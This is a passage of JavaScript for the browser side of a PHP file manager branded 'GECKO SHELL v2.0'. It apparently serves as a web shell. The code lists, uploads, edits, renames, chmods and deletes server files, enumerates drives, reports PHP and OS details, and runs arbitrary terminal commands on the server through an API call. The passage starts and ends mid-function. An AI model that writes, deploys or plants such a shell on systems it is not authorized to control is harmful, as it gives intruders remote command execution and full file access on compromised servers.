  <button class="ico-btn" data-a="rename" title="Rename"><svg viewBox="0 0 16 16"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.2.201-.44.354-.706.454L3.3 14.814a.75.75 0 0 1-.963-.927l.772-2.521a1.75 1.75 0 0 1 .413-.664l8.61-8.61Z" fill="currentColor"/></svg></button>
  <button class="ico-btn" data-a="dl" title="Download"><svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z" fill="currentColor"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.5 3.5a.75.75 0 0 1-1.06 0l-3.5-3.5a.75.75 0 0 1 1.06-1.06l2.678 2.33Z" fill="currentColor"/></svg></button>
  <button class="ico-btn del" data-a="delete" title="Delete"><svg viewBox="0 0 16 16"><path d="M6.5 1.75a.25.25 0 0 1 .25-.25h2.5a.25.25 0 0 1 .25.25V3h-3V1.75Zm4.5 0V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15Z" fill="currentColor"/></svg></button>
</div></li>`;
  }).join('')+'</ul>';
  bindListEvents();
  bindHeaderEvents(sorted);
  updateBulkBar();
}

function bindHeaderEvents(sorted){
  $('#panel').querySelectorAll('.th-sort').forEach(s=>{
    s.onclick = ()=> setSort(s.dataset.sort);
  });
  const chkAll = $('#chkAll');
  if(chkAll){
    chkAll.onclick = e => {
      e.stopPropagation();
      const all = !chkAll.classList.contains('on');
      sorted.forEach(en => {
        const p = itemPath(en.name);
        if(all) S.selected.add(p); else S.selected.delete(p);
      });
      $('#panel').querySelectorAll('.frow').forEach(r=>{
        const on = S.selected.has(r.dataset.path);
        r.classList.toggle('sel', on);
        r.querySelector('.chk-box').classList.toggle('on', on);
      });
      chkAll.classList.toggle('on', all);
      updateBulkBar();
    };
  }
}

function setRowSelected(row, on){
  row.classList.toggle('sel', on);
  const box = row.querySelector('.chk-box');
  if(box) box.classList.toggle('on', on);
  if(on) S.selected.add(row.dataset.path);
  else   S.selected.delete(row.dataset.path);
}
function selectRange(fromIdx, toIdx, on){
  const rows = [...$('#panel').querySelectorAll('.frow')];
  const a = Math.min(fromIdx,toIdx), b = Math.max(fromIdx,toIdx);
  for(let i=a; i<=b; i++) if(rows[i]) setRowSelected(rows[i], on);
}

function bindListEvents(){
  $('#panel').querySelectorAll('.frow').forEach(row=>{
    row.querySelector('.fname-cell').onclick=ev=>{
      if(ev.metaKey || ev.ctrlKey || ev.shiftKey) return;
      openItem(row.dataset.path,row.dataset.dir==='true',row.dataset.ed==='true');
    };
    const box=row.querySelector('.chk-box');
    box.onclick=e=>{
      e.stopPropagation();
      const idx = +row.dataset.idx;
      const on = !box.classList.contains('on');
      if(e.shiftKey && S.lastClickIdx >= 0){
        selectRange(S.lastClickIdx, idx, on);
      } else {
        setRowSelected(row, on);
      }
      S.lastClickIdx = idx;
      const chkAll = $('#chkAll');
      if(chkAll){
        const rows = [...$('#panel').querySelectorAll('.frow')];
        chkAll.classList.toggle('on', rows.every(r=>r.classList.contains('sel')));
      }
      updateBulkBar();
    };
    row.oncontextmenu=e=>{e.preventDefault();showCtx(e,row.dataset.path,row.dataset.dir==='true',row.dataset.name,row.dataset.ed==='true',row.dataset.perm)};
    row.querySelectorAll('[data-a]').forEach(b=>b.onclick=e=>{e.stopPropagation();rowAct(b.dataset.a,row.dataset.path,row.dataset.dir==='true',row.dataset.name,row.dataset.ed==='true',row.dataset.perm)});
  });
}
function bindGridEvents(){
  $('#panel').querySelectorAll('.gcard').forEach(c=>{
    c.onclick=ev=>{
      if(ev.metaKey || ev.ctrlKey){
        ev.preventDefault();
        const on = !c.classList.contains('sel');
        c.classList.toggle('sel', on);
        if(on) S.selected.add(c.dataset.path);
        else   S.selected.delete(c.dataset.path);
        updateBulkBar();
        return;
      }
      openItem(c.dataset.path,c.dataset.dir==='true',c.dataset.ed==='true');
    };
    c.oncontextmenu=e=>{e.preventDefault();showCtx(e,c.dataset.path,c.dataset.dir==='true',c.dataset.name,c.dataset.ed==='true',c.dataset.perm)};
  });
}

function updateBulkBar(){
  const bar = $('#bulkBar');
  const n = S.selected.size;
  if(bar){
    if(n === 0) bar.classList.remove('show');
    else { bar.classList.add('show'); const cn = $('#bulkCount'); if(cn) cn.textContent = n; }
  }
  const sbDel = $('#sbDelSel');
  if(sbDel){
    if(n === 0) sbDel.setAttribute('aria-disabled','true');
    else sbDel.removeAttribute('aria-disabled');
  }
}
async function bulkDownload(){
  if(!S.selected.size) return;
  for(const p of S.selected){
    const a = document.createElement('a');
    a.href = '?download=' + encodeURIComponent(p);
    a.download = '';
    document.body.appendChild(a); a.click(); a.remove();
    await new Promise(r=>setTimeout(r,300));
  }
}
function clearSelection(){
  S.selected.clear();
  $('#panel').querySelectorAll('.frow.sel, .gcard.sel').forEach(r=>{
    r.classList.remove('sel');
    const b = r.querySelector('.chk-box'); if(b) b.classList.remove('on');
  });
  const ca = $('#chkAll'); if(ca) ca.classList.remove('on');
  updateBulkBar();
}

const IMG_EXT = ['png','jpg','jpeg','gif','webp','svg','ico','bmp','avif'];
function isImageFile(name){
  const ext = (name.split('.').pop() || '').toLowerCase();
  return IMG_EXT.includes(ext);
}

function openItem(path,isDir,editable){
  if(isDir){navigate(path);return}
  const name = path.split(/[\/\\]/).pop();
  if(isImageFile(name)) return openImagePreview(path);
  if(editable) return openEditor(path);
  // Untuk file binary lain → langsung download
  window.location='?download='+encodeURIComponent(path);
}
function rowAct(act,path,isDir,name,editable,perm){
  if(act==='open')return openItem(path,isDir,editable);
  if(act==='rename')return showRename(path,name);
  if(act==='dl'&&!isDir)return window.location='?download='+encodeURIComponent(path);
  if(act==='delete')return showDelete(path,name,isDir);
  if(act==='chmod')return showChmod(path,perm);
}

// ─── Image Preview ───────────────────────────────────────────────
let ipCurrentPath = null;
let ipTextLoaded = false;

async function openImagePreview(path){
  ipCurrentPath = path;
  ipTextLoaded = false;
  const name = path.split(/[\/\\]/).pop();
  $('#ipTitle').textContent = name;
  $('#ipPath').textContent = path;
  $('#ipMeta').textContent = '';
  $('#ipImgInfo').textContent = '';
  $('#ipImg').src = '';
  $('#ipTextContent').textContent = 'Click "Text" tab to load raw bytes…';
  setIpTab('image');
  openM('#mImagePreview');

  const url = '?view=' + encodeURIComponent(path);
  $('#ipImg').src = url;
  $('#ipDownload').href = '?download=' + encodeURIComponent(path);

  $('#ipImg').onload = () => {
    const img = $('#ipImg');
    $('#ipImgInfo').textContent = img.naturalWidth + ' × ' + img.naturalHeight + ' px';
  };
  $('#ipImg').onerror = () => {
    $('#ipImgInfo').textContent = 'Failed to load image';
  };

  // Fetch metadata via API for size/modified
  try {
    const meta = await api('list', { path: path.replace(/[\/\\][^\/\\]*$/, '') || '' });
    if (meta.ok) {
      const entry = (meta.entries || []).find(e => e.name === name);
      if (entry) $('#ipMeta').textContent = fmtBytes(entry.size) + ' · ' + fmtDate(entry.modified);
    }
  } catch(e){}
}

function setIpTab(tab){
  $$('#mImagePreview .ip-tab').forEach(b => b.classList.toggle('active', b.dataset.tab === tab));
  $('#ipImagePane').classList.toggle('hidden', tab !== 'image');
  $('#ipTextPane').classList.toggle('hidden', tab !== 'text');
  if (tab === 'text' && !ipTextLoaded && ipCurrentPath) {
    loadFileAsText(ipCurrentPath);
  }
}

async function loadFileAsText(path){
  ipTextLoaded = true;
  const pre = $('#ipTextContent');
  pre.textContent = 'Loading…';
  try {
    const res = await fetch('?view=' + encodeURIComponent(path));
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const blob = await res.blob();
    if (blob.size > 2 * 1024 * 1024) {
      pre.textContent = 'File too large for text view (' + fmtBytes(blob.size) + ')\n\nUse Download to inspect.';
      return;
    }
    const txt = await blob.text();
    pre.textContent = txt;
  } catch(e){
    pre.textContent = 'Error loading file: ' + e.message;
  }
}

// Wire image preview tabs
document.addEventListener('click', e => {
  const tabBtn = e.target.closest('#mImagePreview .ip-tab');
  if (tabBtn) setIpTab(tabBtn.dataset.tab);
});

// ─── Navigate ────────────────────────────────────────────────────
async function navigate(path){
    let apiPath = path;
    
    if (path && typeof path === 'string') {
        // Handle Windows path
        if (path.match(/^[A-Za-z]:/)) {
            apiPath = path.replace(/\\/g, '/');
            apiPath = apiPath.replace(/\/+/g, '/');
            apiPath = apiPath.replace(/^([A-Za-z]:)\/*/, '$1/');
            if (apiPath !== '/' && apiPath.endsWith('/')) {
                // Keep trailing slash for directories
            }
        }
        // Handle Linux path
        else if (path.startsWith('/')) {
            apiPath = path.replace(/\/+/g, '/');
        }
    }
    
    console.log('Navigating to:', apiPath);
    S.path = apiPath;
    S.selected.clear();
    S.lastClickIdx = -1;
    if (typeof updateBulkBar === 'function') updateBulkBar();
    
    // Update URL
    let encodedPath = encodeURIComponent(apiPath);
    history.replaceState(null, '', '?path=' + encodedPath);
    
    renderBreadcrumb();
    if (typeof syncTermCwd === 'function') syncTermCwd();
    const panel = $('#panel');
    panel.style.opacity = '0';
    
    try{
        const d = await api('list', {path: apiPath});
        if(!d.ok) throw new Error(d.error);
        S.entries = d.entries;
        requestAnimationFrame(()=>{
            renderList();
            updateStatus(d);
            requestAnimationFrame(()=>panel.style.opacity='1');
        });
    }catch(e){ 
        toast(e.message, 'error');
        panel.style.opacity = '1';
    }
}

function updateStatus(d){
  const dirs=S.entries.filter(e=>e.is_dir).length, files=S.entries.length-dirs;
  $('#stItems').innerHTML=`<strong>${S.entries.length}</strong> items · <strong>${dirs}</strong> folders · <strong>${files}</strong> files`;
  if(d.disk){
    const u=d.disk.total-d.disk.free, pct=Math.round(u/d.disk.total*100);
    $('#stDisk').innerHTML=`<strong>${fmtBytes(u)}</strong> / ${fmtBytes(d.disk.total)}`;
    $('#diskFill').style.width=pct+'%';
    $('#diskUsed').textContent=fmtBytes(u)+' used';
    $('#diskPct').textContent=pct+'%';
    if(pct>85)$('#diskFill').style.background='var(--red)';
  }
  $('#stPath').textContent='/'+(S.path||'');
  $('#termCwd').textContent=S.path||'~';
  $('#termPathTag').textContent=S.path||'root';
}

// Clock
setInterval(()=>$('#stClock').textContent=new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'}),1000);
$('#stClock').textContent=new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

async function loadInfo(){
  const d=await api('info',{});
  if(d.ok){
    const pct=Math.round((d.disk_total-d.disk_free)/d.disk_total*100);
    $('#sysInfo').innerHTML=`<strong>Environment</strong><br>PHP ${esc(d.php)}<br>OS: ${esc(d.os)}<br>Root: ${esc(BASE.split(/[/\\\\]/).pop())}`;
    $('#diskFill').style.width=pct+'%';
    $('#diskUsed').textContent=fmtBytes(d.disk_total-d.disk_free)+' used';
    $('#diskPct').textContent=pct+'%';
  }
}

// ─── Load Drives (Windows) ───────────────────────────────────────
async function loadDrives() {
    const select = $('#driveSelect');
    const box = $('#driveBox');
    if (!select || !box) return;
    box.style.display = 'block';
    select.onchange = (e) => { if (e.target.value) navigate(e.target.value); };
    try {
        const d = await api('drives', {});
        if (d.ok && d.drives && d.drives.length) {
            select.innerHTML = '<option value="">— Select Path —</option>' +
                d.drives.map(drive => `<option value="${esc(drive.path)}">${esc(drive.label)}${drive.total ? ' (' + fmtBytes(drive.total) + ')' : ''}</option>`).join('');
        } else {
            select.innerHTML = '<option value="">— No paths available —</option>';
        }
    } catch(e) {
        select.innerHTML = '<option value="">— Unable to load paths —</option>';
    }
}

// ─── Create ──────────────────────────────────────────────────────
function showCreate(mode){
  S.createMode=mode;
  $('#createTitle').textContent=mode==='file'?'New File':'New Folder';
  $('#createContentWrap').classList.toggle('hidden',mode!=='file');
  $('#createName').value=''; $('#createContent').value='';
  openM('#mCreate');
  setTimeout(()=>$('#createName').focus(),120);
}
$('#createOk').onclick=async()=>{
  const name=$('#createName').value.trim(); if(!name)return toast('Enter a name','error');
  const act=S.createMode==='file'?'create_file':'mkdir';
  const pl={path:S.path,name};
  if(S.createMode==='file')pl.content=$('#createContent').value;
  const d=await api(act,pl);
  if(!d.ok)return toast(d.error,'error');
  closeAll(); toast('Created','ok');
  navigate(S.path);
  if(S.createMode==='file')openEditor(joinPath(S.path,name));
};

// ─── Rename ──────────────────────────────────────────────────────
function showRename(path,name){
  S.renameTarget=path; $('#renameInput').value=name;
  openM('#mRename');
  setTimeout(()=>{$('#renameInput').focus();$('#renameInput').select()},120);
}
$('#renameOk').onclick=async()=>{
  const n=$('#renameInput').value.trim(); if(!n||!S.renameTarget)return;
  const d=await api('rename',{path:S.renameTarget,new_name:n});
  if(!d.ok)return toast(d.error,'error');
  closeAll(); toast('Renamed','ok'); navigate(S.path);
};

// ─── Chmod ───────────────────────────────────────────────────────
function showChmod(path, currentPerm) {
  S.chmodTarget = path;
  $('#chmodInput').value = currentPerm || '0644';
  openM('#mChmod');
  setTimeout(() => { $('#chmodInput').focus(); $('#chmodInput').select() }, 120);
}
$('#chmodOk').onclick = async () => {
  const perm = $('#chmodInput').value.trim();
  if (!perm || !S.chmodTarget) return;
  const d = await api('chmod', { path: S.chmodTarget, perm: perm });
  if (!d.ok) return toast(d.error, 'error');
  closeAll(); toast('Permissions updated', 'ok');
  navigate(S.path);
};

// ─── Delete ──────────────────────────────────────────────────────
function showDelete(path,name,isDir){
  S.deleteTarget=path;
  $('#deleteMsg').innerHTML=`Delete <strong>${esc(name)}</strong>${isDir?' (must be empty)':''}? This cannot be undone.`;
  openM('#mDelete');
}
$('#deleteOk').onclick=async()=>{
  if(!S.deleteTarget)return;
  const d=await api('delete',{path:S.deleteTarget});
  if(!d.ok)return toast(d.error,'error');
  closeAll(); toast('Deleted','ok'); navigate(S.path);
};
async function deleteSelected(){
  if(!S.selected.size)return toast('Nothing selected','error');
  if(!confirm('Delete '+S.selected.size+' item(s)?'))return;
  for(const p of S.selected){const d=await api('delete',{path:p});if(!d.ok){toast(d.error+' — '+p,'error');break}}
  toast('Done','ok'); navigate(S.path);
}

// ─── Editor ──────────────────────────────────────────────────────
const LANG_MAP = {
  php:'php', phtml:'php',
  js:'js', mjs:'js', cjs:'js', ts:'js', tsx:'js', jsx:'js',
  json:'json',
  css:'css', scss:'css', sass:'css', less:'css',
  html:'html', htm:'html', xml:'html', svg:'html', vue:'html',
  md:'md', markdown:'md',
  yml:'yaml', yaml:'yaml',
  sh:'sh', bash:'sh', zsh:'sh',
  sql:'sql',
  py:'py',
};
function detectLang(path){
  const ext = (path.split('.').pop() || '').toLowerCase();
  return LANG_MAP[ext] || 'plain';
}

const HTML_ESC = { '&':'&amp;', '<':'&lt;', '>':'&gt;' };
const escHtml = s => String(s).replace(/[&<>]/g, c => HTML_ESC[c]);

// ─── Tokenizer (regex multi-pattern) ─────────────────────────────
const KEYWORDS_JS = 'function|if|else|return|for|while|do|switch|case|break|continue|class|new|var|let|const|null|true|false|undefined|this|import|export|default|async|await|try|catch|finally|throw|in|of|as|from|extends|typeof|instanceof|delete|void|yield|static|get|set';
const KEYWORDS_PHP = KEYWORDS_JS + '|elseif|endif|endwhile|endfor|endforeach|endswitch|foreach|public|private|protected|namespace|use|self|parent|abstract|trait|interface|implements|fn|match|enum|readonly|require|require_once|include|include_once|echo|print|global|isset|unset|empty|array|list';
const KEYWORDS_PY = 'def|class|if|elif|else|for|while|return|import|from|as|try|except|finally|raise|with|pass|break|continue|lambda|yield|global|nonlocal|None|True|False|and|or|not|is|in';
const KEYWORDS_SH = 'if|then|else|elif|fi|for|while|do|done|case|esac|in|function|return|break|continue|exit|export|local|readonly|source|alias';
const KEYWORDS_SQL = 'SELECT|FROM|WHERE|INSERT|INTO|VALUES|UPDATE|SET|DELETE|CREATE|TABLE|DROP|ALTER|JOIN|LEFT|RIGHT|INNER|OUTER|ON|GROUP|BY|ORDER|HAVING|LIMIT|OFFSET|AS|AND|OR|NOT|NULL|IS|IN|LIKE|BETWEEN|DISTINCT|UNION|INDEX|PRIMARY|KEY|FOREIGN|REFERENCES|DEFAULT|UNIQUE|AUTO_INCREMENT|VARCHAR|INT|TEXT|DATE|DATETIME|TIMESTAMP|BOOLEAN|TRUE|FALSE';

function tokenize(code, lang){
  if (lang === 'plain' || !code) return escHtml(code);

  let patterns;
  if (lang === 'php' || lang === 'js') {
    const kw = lang === 'php' ? KEYWORDS_PHP : KEYWORDS_JS;
    patterns = [
      [/\/\*[\s\S]*?\*\//, 'tk-com'],
      [/\/\/[^\n]*/, 'tk-com'],
      [/#[^\n]*/, 'tk-com'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [/`(?:\\.|[^`\\])*`/, 'tk-str'],
      [/\$[A-Za-z_]\w*/, 'tk-var'],
      [new RegExp('\\b(?:' + kw + ')\\b'), 'tk-key'],
      [/\b(?:true|false|null|undefined|TRUE|FALSE|NULL)\b/, 'tk-bool'],
      [/\b\d+(?:\.\d+)?(?:[eE][+-]?\d+)?\b/, 'tk-num'],
      [/\b[A-Z][A-Za-z0-9_]*\b/, 'tk-cls'],
      [/\b[a-zA-Z_]\w*(?=\s*\()/, 'tk-fn'],
      [/[+\-*/%=<>!&|^~?:]+/, 'tk-op'],
    ];
  } else if (lang === 'css') {
    patterns = [
      [/\/\*[\s\S]*?\*\//, 'tk-com'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [/--[\w-]+/, 'tk-var'],
      [/#[0-9a-fA-F]{3,8}\b/, 'tk-num'],
      [/\b\d+(?:\.\d+)?(?:px|em|rem|%|vh|vw|s|ms|deg|fr|ch|ex|pt)?\b/, 'tk-num'],
      [/@[\w-]+/, 'tk-key'],
      [/\b[a-z-]+(?=\s*:)/i, 'tk-att'],
      [/[.#][\w-]+/, 'tk-cls'],
      [/[{}();,]/, 'tk-pun'],
    ];
  } else if (lang === 'html') {
    patterns = [
      [new RegExp('<!--[\\s\\S]*?-->'), 'tk-com'],
      [new RegExp('<!DOCTYPE[^>]*>', 'i'), 'tk-com'],
      [new RegExp('</?[\\w:-]+'), 'tk-tag'],
      [/[\w:-]+(?=\s*=)/, 'tk-att'],
      [/"(?:[^"\\]|\\.)*"/, 'tk-str'],
      [/'(?:[^'\\]|\\.)*'/, 'tk-str'],
      [new RegExp('/?>'), 'tk-tag'],
    ];
  } else if (lang === 'json') {
    patterns = [
      [/"(?:\\.|[^"\\])*"(?=\s*:)/, 'tk-att'],
      [/"(?:\\.|[^"\\])*"/, 'tk-str'],
      [/\b(?:true|false|null)\b/, 'tk-bool'],
      [/-?\b\d+(?:\.\d+)?(?:[eE][+-]?\d+)?\b/, 'tk-num'],
      [/[{}\[\]:,]/, 'tk-pun'],
    ];
  } else if (lang === 'md') {
    patterns = [
      [/^#{1,6}[^\n]*/, 'tk-md-h'],
      [/```[\s\S]*?```/, 'tk-md-cd'],
      [/`[^`\n]+`/, 'tk-md-cd'],
      [/\*\*[^*\n]+\*\*/, 'tk-md-em'],
      [/_[^_\n]+_/, 'tk-md-em'],
      [/^[\s]*[-*+]\s+/, 'tk-md-li'],
      [/^>[^\n]*/, 'tk-com'],
      [/\[[^\]]*\]\([^)]*\)/, 'tk-str'],
    ];
  } else if (lang === 'yaml') {
    patterns = [
      [/#[^\n]*/, 'tk-com'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [/^[\s-]*[\w.-]+(?=\s*:)/m, 'tk-att'],
      [/\b(?:true|false|null|yes|no)\b/, 'tk-bool'],
      [/\b\d+(?:\.\d+)?\b/, 'tk-num'],
    ];
  } else if (lang === 'sh') {
    patterns = [
      [/#[^\n]*/, 'tk-com'],
      [/"(?:\\.|[^"\\])*"/, 'tk-str'],
      [/'[^']*'/, 'tk-str'],
      [/\$\{[^}]+\}|\$\w+/, 'tk-var'],
      [new RegExp('\\b(?:' + KEYWORDS_SH + ')\\b'), 'tk-key'],
      [/\b\d+\b/, 'tk-num'],
    ];
  } else if (lang === 'sql') {
    patterns = [
      [/--[^\n]*/, 'tk-com'],
      [/\/\*[\s\S]*?\*\//, 'tk-com'],
      [/'(?:[^'\\]|\\.)*'/, 'tk-str'],
      [/"(?:[^"\\]|\\.)*"/, 'tk-str'],
      [new RegExp('\\b(?:' + KEYWORDS_SQL + ')\\b', 'i'), 'tk-key'],
      [/\b\d+(?:\.\d+)?\b/, 'tk-num'],
    ];
  } else if (lang === 'py') {
    patterns = [
      [/#[^\n]*/, 'tk-com'],
      [/"""[\s\S]*?"""|'''[\s\S]*?'''/, 'tk-str'],
      [/"(?:\\.|[^"\\\n])*"/, 'tk-str'],
      [/'(?:\\.|[^'\\\n])*'/, 'tk-str'],
      [new RegExp('\\b(?:' + KEYWORDS_PY + ')\\b'), 'tk-key'],
      [/\b\d+(?:\.\d+)?\b/, 'tk-num'],
      [/\b[a-zA-Z_]\w*(?=\s*\()/, 'tk-fn'],
    ];
  } else {
    return escHtml(code);
  }

  // Build mega regex with capture group per pattern
  const megaSrc = patterns.map(p => '(' + p[0].source + ')').join('|');
  const flags = 'gm';
  const regex = new RegExp(megaSrc, flags);

  let out = '';
  let last = 0;
  let m;
  while ((m = regex.exec(code)) !== null) {
    if (m.index > last) out += escHtml(code.slice(last, m.index));
    let cls = null;
    for (let i = 0; i < patterns.length; i++) {
      if (m[i + 1] !== undefined) { cls = patterns[i][1]; break; }
    }
    out += cls ? '<span class="' + cls + '">' + escHtml(m[0]) + '</span>' : escHtml(m[0]);
    last = m.index + m[0].length;
    // Prevent infinite loop on zero-length matches
    if (m[0].length === 0) regex.lastIndex++;
  }
  if (last < code.length) out += escHtml(code.slice(last));
  return out;
}

let edLang = 'plain';

async function openEditor(path){
  S.editorPath=path;
  edLang = detectLang(path);
  $('#edArea').classList.toggle('no-highlight', edLang === 'plain');
  $('#edTitle').textContent=path.split(/[\/\\]/).pop();
  $('#edPath').textContent=path;
  $('#edText').value=''; $('#edHighlight').innerHTML=''; updateLineNums(); openM('#mEditor');
  const d=await api('read',{path});
  if(!d.ok){closeM('#mEditor');return toast(d.error,'error')}
  $('#edText').value=d.content;
  $('#edMeta').textContent=fmtBytes(d.size)+' · '+fmtDate(d.modified)+' · '+edLang.toUpperCase();
  refreshHighlight();
  updateLineNums();
  setTimeout(()=>$('#edText').focus(),120);
}

function refreshHighlight(){
  if (edLang === 'plain') return;
  const code = $('#edText').value;
  // Trailing newline ensures last line is rendered properly
  const html = tokenize(code + (code.endsWith('\n') ? ' ' : ''), edLang);
  $('#edHighlight').innerHTML = html;
}

function updateLineNums(){
  const ta=$('#edText'),lines=(ta.value.match(/\n/g)||[]).length+1;
  const ln=$('#lineNums'); let h='';
  for(let i=1;i<=lines;i++)h+=`<div>${i}</div>`;
  ln.innerHTML=h; ln.scrollTop=ta.scrollTop;
}

// Debounced highlight refresh on input — keeps typing smooth
let edHlTimer;
function scheduleHighlight(){
  if (edLang === 'plain') return;
  clearTimeout(edHlTimer);
  edHlTimer = setTimeout(refreshHighlight, 30);
}

$('#edText').addEventListener('input', () => { updateLineNums(); scheduleHighlight(); });
$('#edText').addEventListener('scroll', () => {
  $('#lineNums').scrollTop = $('#edText').scrollTop;
  $('#edHighlight').scrollTop = $('#edText').scrollTop;
  $('#edHighlight').scrollLeft = $('#edText').scrollLeft;
});
$('#edSave').onclick=saveEditor;
async function saveEditor(){
  if(!S.editorPath)return;
  const d=await api('save',{path:S.editorPath,content:$('#edText').value});
  if(!d.ok)return toast(d.error,'error');
  toast('Saved','ok'); $('#edMeta').textContent=fmtBytes($('#edText').value.length)+' · just now';
  navigate(S.path);
}

// ─── Upload Files ──────────────────────────────────────────────────
async function uploadFiles(files) {
    if (!files || files.length === 0) {
        toast('No files selected', 'error');
        return;
    }
    let successCount = 0;
    let failCount = 0;
    for (const file of files) {
        try {
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('path', S.path);
            formData.append('file', file);
            
            const response = await fetch(API, {
                method: 'POST',
                body: formData
            });
            const data = await response.json();
            if (data.ok) {
                successCount++;
                toast(`✓ ${file.name} uploaded`, 'ok');
            } else {
                failCount++;
                toast(`✗ ${file.name}: ${data.error || 'Upload failed'}`, 'error');
            }
        } catch (err) {
            failCount++;
            toast(`✗ ${file.name}: Network error`, 'error');
            console.error('Upload error:', err);
        }
    }
    if (successCount > 0) {
        closeAll();
        navigate(S.path);
    }
    if (failCount > 0 && successCount === 0) {
        toast(`Upload failed: ${failCount} file(s)`, 'error');
    } else if (successCount > 0 && failCount > 0) {
        toast(`Uploaded: ${successCount}, Failed: ${failCount}`, successCount > 0 ? 'ok' : 'error');
    }
}

// ─── Upload Event Handlers ─────────────────────────────────────────
const dz = $('#dropzone');
const fi = $('#fileInput');

if (dz) {
  dz.onclick = (e) => {
      e.stopPropagation();
      if (fi) fi.click();
  };
}
if (fi) {
  fi.onchange = (e) => {
      if (fi.files && fi.files.length > 0) {
          uploadFiles(Array.from(fi.files));
          fi.value = '';
      }
  };
}
if (dz) {
  dz.ondragover = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dz.classList.add('over');
  };
  dz.ondragleave = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dz.classList.remove('over');
  };
  dz.ondrop = (e) => {
      e.preventDefault();
      e.stopPropagation();
      dz.classList.remove('over');
      const files = Array.from(e.dataTransfer.files);
      if (files.length > 0) {
          uploadFiles(files);
      }
  };
}

const panel = $('#panel');
if (panel) {
  panel.ondragover = (e) => {
      e.preventDefault();
      e.stopPropagation();
      panel.classList.add('drag-over');
  };
  panel.ondragleave = (e) => {
      e.preventDefault();
      e.stopPropagation();
      panel.classList.remove('drag-over');
  };
  panel.ondrop = (e) => {
      e.preventDefault();
      e.stopPropagation();
      panel.classList.remove('drag-over');
      const files = Array.from(e.dataTransfer.files);
      if (files.length > 0) {
          uploadFiles(files);
      }
  };
}

// ─── Terminal ────────────────────────────────────────────────────
S.termCount = 0;

function openTerm(){
  openM('#mTerm');
  syncTermCwd();
  const o=$('#termOut');
  if(!o.children.length){
    const banner=document.createElement('div');
    banner.className='term-banner';
    banner.innerHTML='<b>GECKO SHELL · v2.0</b>Type a command and press <span class="kbd">Enter</span>. Use <span class="kbd">↑</span>/<span class="kbd">↓</span> for history, <span class="kbd">Ctrl+L</span> to clear.';
    o.appendChild(banner);
  }
  setTimeout(()=>$('#termIn').focus(),150);
}

function syncTermCwd(){
  const path = S.path || '~';
  const cwdEl = $('#termCwd');
  const promptCwdEl = $('#termPromptCwd');
  if(cwdEl) cwdEl.textContent = path;
  if(promptCwdEl){
    const parts = path.split(/[\/\\]/).filter(p=>p);
    promptCwdEl.textContent = parts.length>2 ? '…/'+parts.slice(-2).join('/') : (path||'~');
  }
}

function fmtClock(){
  const d=new Date();
  return String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0')+':'+String(d.getSeconds()).padStart(2,'0');
}
function fmtDur(ms){
  if(ms<1000)return ms+'ms';
  if(ms<60000)return (ms/1000).toFixed(2)+'s';
  return Math.floor(ms/60000)+'m'+Math.floor((ms%60000)/1000)+'s';
}

function appendTerm(text,cls='out'){
  const o=$('#termOut');
  const d=document.createElement('div');
  d.className='term-line '+(cls||'');
  d.textContent=text;
  o.appendChild(d);
  o.scrollTop=o.scrollHeight;
}

function makeBlock(cmd){
  const b=document.createElement('div');
  b.className='term-block running';
  const cmdLine=document.createElement('div');
  cmdLine.className='term-cmd-line';
  const promptSpan=document.createElement('span');
  promptSpan.className='term-prompt-mini';
  promptSpan.textContent='❯';
  const cmdText=document.createElement('span');
  cmdText.className='term-cmd-text';
  cmdText.textContent=cmd;
  const meta=document.createElement('span');
  meta.className='term-cmd-meta';
  const time=document.createElement('span');
  time.className='term-time';
  time.textContent=fmtClock();
  const dur=document.createElement('span');
  dur.className='term-duration';
  dur.textContent='…';
  meta.appendChild(time); meta.appendChild(dur);
  cmdLine.appendChild(promptSpan); cmdLine.appendChild(cmdText); cmdLine.appendChild(meta);
  const out=document.createElement('div');
  out.className='term-out-text';
  out.innerHTML='<div class="term-running-dots"><span></span><span></span><span></span></div>';
  b.appendChild(cmdLine); b.appendChild(out);
  return b;
}

async function runTerm(cmd){
  if(!cmd.trim())return;
  const o=$('#termOut');
  const block=makeBlock(cmd);
  o.appendChild(block);
  o.scrollTop=o.scrollHeight;
  $('#termSpinner').classList.add('show');
  const t0=performance.now();
  let d;
  try{
    d=await api('terminal',{path:S.path,command:cmd});
  }catch(e){
    d={ok:false,error:'Network error'};
  }
  const dt=Math.round(performance.now()-t0);
  const durEl=block.querySelector('.term-duration');
  const outEl=block.querySelector('.term-out-text');
  block.classList.remove('running');
  durEl.textContent=fmtDur(dt);
  $('#termSpinner').classList.remove('show');
  if(!d.ok){
    block.classList.add('error');
    outEl.textContent=d.error||'Error';
  }else{
    if(d.exit_code) block.classList.add('error');
    else block.classList.add('success');
    outEl.textContent=d.output||'(no output)';
    if(d.exit_code){
